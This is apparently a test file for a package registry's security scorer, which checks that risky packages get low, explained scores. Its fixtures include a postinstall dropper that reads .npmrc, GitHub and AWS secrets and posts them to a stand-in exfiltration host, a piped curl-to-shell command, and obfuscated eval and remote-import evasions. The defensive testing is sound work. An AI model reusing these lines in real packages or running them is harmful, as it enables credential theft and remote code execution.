// Spec: every published version gets an explained security score (0-100, higher is safer),
// computed from the tarball, the manifest and publish history. Popularity is not an input.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, run, getJson, dig, type Registry, type PkgSpec } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
let clock = Date.parse("2026-03-01T00:00:00Z");
let reg: Registry;
let alice: string;
let mallory: string;
let work: string;

async function publish(spec: PkgSpec, token: string): Promise<void> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, spec, reg, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`publish ${spec.name}@${spec.version} failed: ${r.out}`);
}

type Signal = { id: string; points: number; evidence: string[] };
function scoreOf(body: unknown): number {
  const s = dig(body, "score");
  if (typeof s !== "number") throw new Error(`no score in ${JSON.stringify(body)}`);
  return s;
}
function signalsOf(body: unknown): Signal[] {
  const raw = dig(body, "signals");
  if (!Array.isArray(raw)) return [];
  return raw.flatMap((s: unknown): Signal[] => {
    const id = dig(s, "id");
    const points = dig(s, "points");
    const evidence = dig(s, "evidence");
    if (typeof id !== "string" || typeof points !== "number") return [];
    return [{ id, points, evidence: Array.isArray(evidence) ? evidence.map(String) : [] }];
  });
}
async function score(name: string, version: string): Promise<unknown> {
  const r = await getJson(`${reg.url}-/apm/v1/score/${name.replace("/", "%2f")}/${version}`);
  expect(r.status, JSON.stringify(r.body)).toBe(200);
  return r.body;
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  alice = await addUser(reg, "alice");
  mallory = await addUser(reg, "mallory");
  work = mkdtempSync(join(tmpdir(), "apm-score-"));
  await publish({ name: "clean-lib", version: "1.0.0", extra: { repository: "github:alice/clean-lib", types: "index.d.ts" }, files: { "index.js": "export const add = (a, b) => a + b;\n", "index.d.ts": "export declare const add: (a: number, b: number) => number;\n" } }, alice);
  await publish(
    {
      name: "dropper",
      version: "1.0.0",
      scripts: { postinstall: "node setup.js" },
      files: {
        "index.js": "module.exports = 1;\n",
        "setup.js": [
          "const cp = require('child_process');",
          "const fs = require('fs');",
          "const os = require('os');",
          "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');",
          "const payload = Buffer.from(JSON.stringify({ npmrc, env: process.env.GITHUB_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY })).toString('base64');",
          "fetch('https://exfil.example.com/c', { method: 'POST', body: payload });",
          "cp.execSync('curl -s https://evil.example.com/x.sh | sh');",
          "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());",
        ].join("\n"),
      },
    },
    mallory,
  );
  clock += 30 * DAY;
  await publish({ name: "evolving", version: "1.0.0", files: { "index.js": "module.exports = 1;\n" } }, alice);
  clock += 30 * DAY;
  await publish({ name: "evolving", version: "1.0.1", scripts: { postinstall: "node -e \"require('https').get('https://x.example.com')\"" }, files: { "index.js": "module.exports = 2;\n" } }, alice);
  clock += 30 * DAY;
});
afterAll(async () => {
  await reg?.stop();
});

describe("security score", () => {
  test("a small typed library with no install scripts scores high", async () => {
    const body = await score("clean-lib", "1.0.0");
    expect(scoreOf(body)).toBeGreaterThanOrEqual(85);
    expect(["A", "B"]).toContain(String(dig(body, "grade")));
  });

  test("a credential-stealing postinstall dropper scores very low with explained signals", async () => {
    const body = await score("dropper", "1.0.0");
    expect(scoreOf(body)).toBeLessThan(30);
    expect(String(dig(body, "grade"))).toBe("F");
    const ids = signalsOf(body).map((s) => s.id);
    for (const id of ["install-script", "shell-exec", "network", "credential-access", "eval"]) expect(ids).toContain(id);
    const cred = signalsOf(body).find((s) => s.id === "credential-access");
    expect(cred?.points ?? 0).toBeLessThan(0);
    expect((cred?.evidence ?? []).join(" ")).toContain("setup.js");
  });

  test("every signal says why: a label and a point value", async () => {
    const body = await score("dropper", "1.0.0");
    const raw = dig(body, "signals");
    expect(Array.isArray(raw)).toBe(true);
    for (const s of Array.isArray(raw) ? raw : []) {
      expect(typeof dig(s, "label")).toBe("string");
      expect(typeof dig(s, "points")).toBe("number");
    }
  });

  test("score diff names what changed since the previous version", async () => {
    const body = await score("evolving", "1.0.1");
    expect(dig(body, "previous", "version")).toBe("1.0.0");
    const prev = Number(dig(body, "previous", "score"));
    expect(scoreOf(body)).toBeLessThan(prev);
    const changes = JSON.stringify(dig(body, "changes"));
    expect(changes).toContain("install-script");
  });

  test("a version added by a different publisher than the package's history is flagged", async () => {
    // alice adds mallory as owner; mallory publishes a patch
    const add = await getJson(`${reg.url}-/apm/v1/owners`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "clean-lib", user: "mallory", password: "correct-horse-battery" }),
    });
    expect(add.status, JSON.stringify(add.body)).toBe(200);
    await publish({ name: "clean-lib", version: "1.0.1", extra: { repository: "github:alice/clean-lib", types: "index.d.ts" }, files: { "index.js": "export const add = (a, b) => a + b;\n", "index.d.ts": "export declare const add: (a: number, b: number) => number;\n" } }, mallory);
    const body = await score("clean-lib", "1.0.1");
    expect(signalsOf(body).map((s) => s.id)).toContain("new-publisher");
  });

  test("a version published in the last 24 hours carries a temporary recent-publish signal", async () => {
    await publish({ name: "fresh-off-press", version: "0.1.0" }, alice);
    const body = await score("fresh-off-press", "0.1.0");
    expect(signalsOf(body).map((s) => s.id)).toContain("recent");
    clock += 3 * DAY;
    const later = await score("fresh-off-press", "0.1.0");
    expect(signalsOf(later).map((s) => s.id)).not.toContain("recent");
  });

  test("the packument carries a compact score on every version", async () => {
    const { body } = await getJson(`${reg.url}dropper`);
    expect(typeof dig(body, "versions", "1.0.0", "_apmScore", "score")).toBe("number");
  });

  test("search results include the score", async () => {
    const { body } = await getJson(`${reg.url}-/v1/search?text=clean`);
    expect(typeof dig(body, "objects", 0, "apmScore", "score")).toBe("number");
  });
});

describe("score robustness (council round 1)", () => {
  test("a release that adds a low-scoring dependency is flagged even when its own code is clean", async () => {
    await publish({ name: "innocent-wrapper", version: "1.0.0", files: { "index.js": "module.exports = 1;\n" } }, alice);
    clock += 10 * DAY;
    await publish({ name: "innocent-wrapper", version: "1.1.0", dependencies: { dropper: "^1.0.0" }, files: { "index.js": "module.exports = require('dropper');\n" } }, alice);
    clock += 10 * DAY;
    const body = await score("innocent-wrapper", "1.1.0");
    const ids = signalsOf(body).map((s) => s.id);
    expect(ids).toContain("risky-dependency");
    expect(JSON.stringify(dig(body, "signals"))).toContain("dropper");
    expect(scoreOf(body)).toBeLessThan(70);
    expect(JSON.stringify(dig(body, "changes"))).toContain("new-dependency");
  });

  test("common evasions of eval and remote code loading are still caught", async () => {
    await publish(
      {
        name: "sneaky-loader",
        version: "1.0.0",
        files: {
          "index.js": ["const g = globalThis;", "g['ev' + 'al'](atob('Y29uc29sZS5sb2coMSk='));", "import('https://cdn.example.com/stage2.js');", "const r = require; r(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));"].join("\n"),
        },
      },
      alice,
    );
    clock += 2 * DAY;
    const ids = signalsOf(await score("sneaky-loader", "1.0.0")).map((s) => s.id);
    expect(ids).toContain("eval");
    expect(ids).toContain("network");
  });

  test("the report says what it could not check", async () => {
    const body = await score("clean-lib", "1.0.0");
    const nc = JSON.stringify(dig(body, "notChecked"));
    expect(nc.toLowerCase()).toContain("runtime");
  });

  test("time since publish never changes the number, only the recent signal", async () => {
    await publish({ name: "timeless", version: "1.0.0" }, alice);
    const now = scoreOf(await score("timeless", "1.0.0"));
    clock += 3 * DAY;
    const later = scoreOf(await score("timeless", "1.0.0"));
    expect(now).toBe(later);
  });
});

describe("package facts and search ranking", () => {
  test("the package API returns decision facts: module format, types, install scripts, maintainers", async () => {
    const { status, body } = await getJson(`${reg.url}-/apm/v1/packages/clean-lib`);
    expect(status).toBe(200);
    expect(dig(body, "facts", "types")).toBe("bundled");
    expect(dig(body, "facts", "installScripts")).toBe(false);
    expect(["esm", "cjs", "dual"]).toContain(String(dig(body, "facts", "moduleFormat")));
    expect(JSON.stringify(dig(body, "maintainers"))).toContain("alice");
    const drop = await getJson(`${reg.url}-/apm/v1/packages/dropper`);
    expect(dig(drop.body, "facts", "installScripts")).toBe(true);
    expect(dig(drop.body, "facts", "types")).toBe("none");
  });

  test("an exact name match is always the first search result", async () => {
    const { body } = await getJson(`${reg.url}-/v1/search?text=evolving`);
    expect(dig(body, "objects", 0, "package", "name")).toBe("evolving");
  });
});
